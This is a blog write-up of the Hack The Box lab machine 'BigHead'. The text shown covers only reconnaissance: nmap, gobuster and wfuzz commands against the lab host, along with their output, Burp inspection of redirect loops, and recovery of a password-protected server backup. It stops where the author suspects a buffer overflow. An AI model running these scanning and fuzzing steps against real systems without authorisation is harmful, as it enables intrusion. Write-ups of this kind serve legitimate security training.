<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - BigHead - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-BigHead"><a href="#Hack-The-Box-BigHead" class="headerlink" title="Hack The Box - BigHead"></a>Hack The Box - BigHead</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, Today BigHead retired and here’s my write-up about it. As you can see it’s an insane box, actually it’s hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn’t bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of <a href="https://www.imdb.com/title/tt2575988/" target="_blank" rel="noopener">Silicon Valley</a> references :D even the name of the box is the name of one of the characters, Anyway let’s not waste more time. It’s a windows box and its ip is <code>10.10.10.112</code>. I added it to <code>/etc/hosts</code> as <code>bighead.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/bighead/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with nmap to scan for open ports and services :<br><code>nmap -sV -sT -sC bighead.htb</code><br><img src="/images/hackthebox/bighead/1.png" alt=""><br>Only one port is open which is port 80 and it’s running http. Let’s take a look.</p>
<h2 id="HTTP-Enumeration"><a href="#HTTP-Enumeration" class="headerlink" title="HTTP Enumeration"></a>HTTP Enumeration</h2><p><img src="/images/hackthebox/bighead/2.png" alt=""><br>It’s a website titled <code>PiperNet Comes</code>. The background is an image of the characters from the TV show “Silicon Valley”, and in the middle it’s saying <code>PIPERNET IS HERE</code>. Also there are two links down there, First one is <code>THIS IS PIPERNET</code> which is the homepage and the other one is <code>PIEDPIPERCOIN</code>. Let’s scroll down and see what else do we have :<br><img src="/images/hackthebox/bighead/3.png" alt=""><br><code>PIEDPIPERCOIN COMES</code>, and there’s a small description of what piedpipercoin is.<br><img src="/images/hackthebox/bighead/4.png" alt=""><br><img src="/images/hackthebox/bighead/5.png" alt=""><br><img src="/images/hackthebox/bighead/6.png" alt=""><br>After that there are some pictures for the characters from “Silicon Valley” and some stuff about each one of them, Nothing is interesting so far. At the bottom of the page there is this contact form :<br><img src="/images/hackthebox/bighead/7.png" alt=""><br>I looked at the contact info and I noticed that the email was <code>info@bachmanity.htb</code>. Let’s check that domain, but before doing that I wanted to check the other page <code>PIEDPIPERCOIN</code> :<br><img src="/images/hackthebox/bighead/8.png" alt=""><br>Instead of <code>PIEDPIPERCOIN COMES</code> it’s saying <code>PIEDPIPERCOIN CAME</code> but nothing is interesting. Let’s check <code>bachmanity.htb</code>, we need to add it to <code>/etc/hosts</code> first :<br><img src="/images/hackthebox/bighead/9.png" alt=""><br><code>bachmanity.htb</code><br><img src="/images/hackthebox/bighead/10.png" alt=""><br>It’s only that image and nothing else :<br><img src="/images/hackthebox/bighead/11.png" alt=""><br>Back to the contact form, I wanted to see if it’s exploitable in any way. I filled all the fields with <code>test</code> :<br><img src="/images/hackthebox/bighead/12.png" alt=""><br><img src="/images/hackthebox/bighead/13.png" alt=""><br>It sends the request to <code>mailer.bighead.htb</code>, Let’s add it to <code>/etc/hosts</code> and try again :<br><img src="/images/hackthebox/bighead/14.png" alt=""><br><img src="/images/hackthebox/bighead/15.png" alt=""><br>It shows this message then it redirects the browser back to <code>bighead.htb</code>. I also intercepted the request with burp :<br><img src="/images/hackthebox/bighead/16.png" alt=""><br><img src="/images/hackthebox/bighead/17.png" alt=""><br>Tried to manipulate the input, but couldn’t achieve anything. I went to <code>mailer.bighead.htb</code> and got redirected to <code>mailer.bighead.htb/testlink</code> which shows this error :<br><img src="/images/hackthebox/bighead/18.png" alt=""><br><img src="/images/hackthebox/bighead/19.png" alt=""><br>In the background I ran <code>gobuster</code> on <code>bachmanity.htb</code>  and <code>bighead.htb</code> with <code>/usr/share/wordlists/dirb/common.txt</code>. <code>bachmanity.htb</code> didn’t have anything :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.0              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;bachmanity.htb&#x2F;</span><br><span class="line">[+] Threads      : 100</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 2m0s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;04&#x2F;24 20:21:01 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;index.html (Status: 200)</span><br><span class="line">&#x2F;index.htm (Status: 200)</span><br></pre></td></tr></table></figure>
<p>but <code>bighead.htb</code> gave some results :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.0              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;bighead.htb&#x2F;</span><br><span class="line">[+] Threads      : 100</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 2m0s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;04&#x2F;24 20:16:23 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;assets (Status: 301)</span><br><span class="line">&#x2F;backend (Status: 302)</span><br><span class="line">&#x2F;Images (Status: 301)</span><br><span class="line">&#x2F;images (Status: 301)</span><br><span class="line">&#x2F;index.html (Status: 200)</span><br></pre></td></tr></table></figure>
<p>I went to <code>/assets</code> and it was forbidden :<br><img src="/images/hackthebox/bighead/20.png" alt=""><br><code>/backend</code> redirected the browser to <code>bighead.htb/BigHead</code> which gave the same error we saw before :<br><img src="/images/hackthebox/bighead/21.png" alt=""><br><img src="/images/hackthebox/bighead/22.png" alt=""><br>I clicked on <code>error log</code> and it gave the same error :<br><img src="/images/hackthebox/bighead/23.png" alt=""><br>Let’s check if there are any other subdomains. I used <code>wfuzz</code> with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1mil-5000.txt" target="_blank" rel="noopener">subdomains-top1mil-5000.txt</a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">seclists</a>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http:&#x2F;&#x2F;10.10.10.112</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/bighead/24.png" alt=""><br>non-valid subdomain responses are <code>11232</code> chars so we will remove those from the output :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http:&#x2F;&#x2F;10.10.10.112</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/bighead/25.png" alt=""><br>We got 3 subdomains : <code>dev</code>, <code>mailer</code> and <code>code</code>. We already know about <code>mailer</code>, let’s add <code>dev</code> and <code>code</code> :<br><img src="/images/hackthebox/bighead/26.png" alt=""><br><code>code.bighead.htb</code> redirected the browser to <code>127.0.0.1:5080/testlink/login.php</code><br><img src="/images/hackthebox/bighead/27.png" alt=""><br><img src="/images/hackthebox/bighead/28.png" alt=""><br>So to see what’s on <code>code.bighead.htb</code> we will probably need to forward an internal service to our box. We can’t do that now so we will ignore <code>code.bighead.htb</code> for now.<br><code>dev.bighead.htb</code> shows this image of bighead :<br><img src="/images/hackthebox/bighead/29.png" alt=""><br>Source has nothing interesting :<br><img src="/images/hackthebox/bighead/30.png" alt=""><br>I ran <code>gobuster</code> again and got some results :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.0              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;dev.bighead.htb&#x2F;</span><br><span class="line">[+] Threads      : 100</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 2m0s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;04&#x2F;24 20:55:05 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;blog (Status: 302)</span><br><span class="line">&#x2F;blog_ajax (Status: 302)</span><br><span class="line">&#x2F;blog_inlinemod (Status: 302)</span><br><span class="line">&#x2F;blog_usercp (Status: 302)</span><br><span class="line">&#x2F;blog_search (Status: 302)</span><br><span class="line">&#x2F;blog_report (Status: 302)</span><br><span class="line">&#x2F;blogger (Status: 302)</span><br><span class="line">&#x2F;blogindex (Status: 302)</span><br><span class="line">&#x2F;bloggers (Status: 302)</span><br><span class="line">&#x2F;blogs (Status: 302)</span><br><span class="line">&#x2F;blogspot (Status: 302)</span><br><span class="line">&#x2F;wp-content (Status: 302)</span><br></pre></td></tr></table></figure>
<p>But all these pages gave this result :<br><img src="/images/hackthebox/bighead/31.png" alt=""><br>I intercepted the request in burp to figure out why :<br><img src="/images/hackthebox/bighead/32.png" alt=""><br><img src="/images/hackthebox/bighead/33.png" alt=""><br>The response is <code>302</code>, by following the redirect :<br><img src="/images/hackthebox/bighead/34.png" alt=""><br>It responds with another <code>302</code><br><img src="/images/hackthebox/bighead/35.png" alt=""><br>So it will keep redirecting us in a loop and we won’t get anything.<br>At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with <code>wfuzz</code> instead of <code>gobuster</code> and I got one more result :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz --hc 404 -c -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt -u http:&#x2F;&#x2F;dev.bighead.htb&#x2F;FUZZ</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/bighead/36.png" alt=""><br>The reason why <code>gobuster</code> didn’t show us this page is because of the status code. <code>gobuster</code> only showed results with these status codes : <code>[+] Status codes : 200,204,301,302,307,403</code>, While <code>wfuzz</code> showed everything except <code>404</code> responses, <code>--hc 404</code>. <code>/coffee</code> gave a response of <code>418</code> which is weird. I looked it up and found some info about it <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/418" target="_blank" rel="noopener">here</a>. <code>418 I&#39;m a teapot</code> ! Anyway let’s take a look :<br><code>http://dev.bighead.htb/coffee</code><br><img src="/images/hackthebox/bighead/37.png" alt=""><br>It’s showing this <code>gif</code> :<br><img src="/images/hackthebox/bighead/teapot.gif" alt=""><br>Which is saying : “The requested entity body is short and stout. Tip me over and pour me out.” ?!<br>I intercepted the request with burp and looked at the response :<br><img src="/images/hackthebox/bighead/38.png" alt=""><br><img src="/images/hackthebox/bighead/39.png" alt=""><br>I noticed a weird server name : <code>BigheadWebSvr 1.0</code>. I looked it up and found a repository on the machine creator’s github (3mrgnc3) :<br><img src="/images/hackthebox/bighead/40.png" alt=""><br>I searched through the commits and got <a href="https://github.com/3mrgnc3/BigheadWebSvr/blob/b1b4d6ed5f2298bc243cd56cab77cd6fb4e48c3d/BHWS_Backup.zip" target="_blank" rel="noopener">this one</a> which seemed to be the right one.<br><img src="/images/hackthebox/bighead/41.png" alt=""><br>It asked for a password :<br><img src="/images/hackthebox/bighead/42.png" alt=""><br>I tried to guess it and after some attempts <code>bighead</code> worked :<br><img src="/images/hackthebox/bighead/43.png" alt=""><br><img src="/images/hackthebox/bighead/44.png" alt=""><br><img src="/images/hackthebox/bighead/45.png" alt=""><br>Of course it’s a windows executable so we will switch to a windows machine. At this point the hint was quite obvious : “The requested entity body is short and stout. Tip me over and pour me out.”, This server is probably vulnerable to a buffer overflow.</p>
